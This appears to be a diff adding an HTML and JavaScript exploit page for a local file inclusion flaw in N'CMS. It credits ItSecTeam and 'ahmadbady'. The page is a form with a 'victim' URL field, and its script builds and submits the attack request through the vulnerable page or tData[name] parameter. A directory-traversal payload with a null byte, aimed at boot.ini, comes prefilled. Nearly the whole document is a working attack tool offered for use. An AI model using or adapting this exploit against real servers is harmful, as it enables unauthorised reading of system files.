@@ -1,0 +1,67 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1254&quot;&gt;
+&lt;title&gt;#####coded by ahmadbady#####&lt;/title&gt;
+
+&lt;script language=&quot;JavaScript&quot;&gt;
+
+//===========================================================================
+//( #Topic    : N&#039;CMS  Updated 2010-02-24
+//( #Bug type : local file include
+//( #Download : http://sourceforge.net/projects/n-cms/files/N-CMS%20Equipe/n-cms-equipe-V1.1C-Debug.zip/download
+//( #Advisory : 
+//===========================================================================
+//( #Author : ItSecTeam
+//( #Email  : Bug@ITSecTeam.com #
+//( #Website: http://www.itsecteam.com #
+//( #Forum  : http://forum.ITSecTeam.com #
+//---------------------------------------------------------------------
+
+
+var variable1 =&quot;?page=&quot;
+var variable2 =&quot;?tData[name]=&quot;
+function it(){
+  if (xpl.file.value==&quot;includs.php&quot;){
+          variable1 = variable2;
+         
+                              }
+                xpl.action= xpl.victim.value+xpl.path.value+xpl.file.value+variable1+xpl.file0.value;xpl.submit();                                        
+            }
+&lt;/script&gt;
+
+&lt;/head&gt;
+
+&lt;body bgcolor=&quot;#FFFFFF&quot;&gt;
+
+&lt;p align=&quot;left&quot;&gt;&lt;font color=&quot;#0000FF&quot;&gt;N&#039;CMS &amp;amp; N&#039;Games local file include 
+Vulnerability&lt;/font&gt;&lt;/p&gt;
+
+&lt;p align=&quot;left&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;vul1 file:/path/template/theme1/content/body.php&lt;/font&gt;&lt;/p&gt;
+&lt;p align=&quot;left&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;vul2 file:/path/template/theme1/content/includs.php&lt;/font&gt;&lt;/p&gt;
+&lt;p align=&quot;left&quot;&gt;&lt;font color=&quot;#0000FF&quot;&gt;-----------------------------------&lt;/font&gt;&lt;/p&gt;
+&lt;form method=&quot;post&quot; name=&quot;xpl&quot; onSubmit=&quot;it();&quot;&gt;
+    &lt;p align=&quot;left&quot;&gt;
+    &lt;font 
+size=&quot;2&quot; face=&quot;Tahoma&quot;&gt;
+  	victim:
+  	&lt;input type=&quot;text&quot; name=&quot;victim&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot; value=&quot;http://127.0.0.1&quot;&gt; 
+	path:
+	&lt;input type=&quot;text&quot; name=&quot;path&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot; value=&quot;/path/template/theme1/content/&quot;&gt; 
+	file:
+	&lt;input type=&quot;text&quot; name=&quot;file&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot;&gt;&amp;nbsp;&amp;nbsp; 
+	lfi code:&amp;nbsp;
+	&lt;input type=&quot;text&quot; name=&quot;file0&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot; value=&quot;..%2F..%2F..%2F..%2F..%2Fboot.ini%00&quot;&gt;&lt;/p&gt;
+  	&lt;/p&gt;
+&lt;center&gt;
+
+&lt;/p&gt;
+  &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;GO&quot; name=&quot;B1&quot; style=&quot;float: left&quot;&gt;&lt;input type=&quot;reset&quot; 
+value=&quot;reset&quot; name=&quot;B2&quot; style=&quot;float: left&quot;&gt;&lt;/p&gt;
+&lt;/form&gt;
+&lt;p&gt;&lt;br&gt;
+&amp;nbsp;&lt;/p&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+
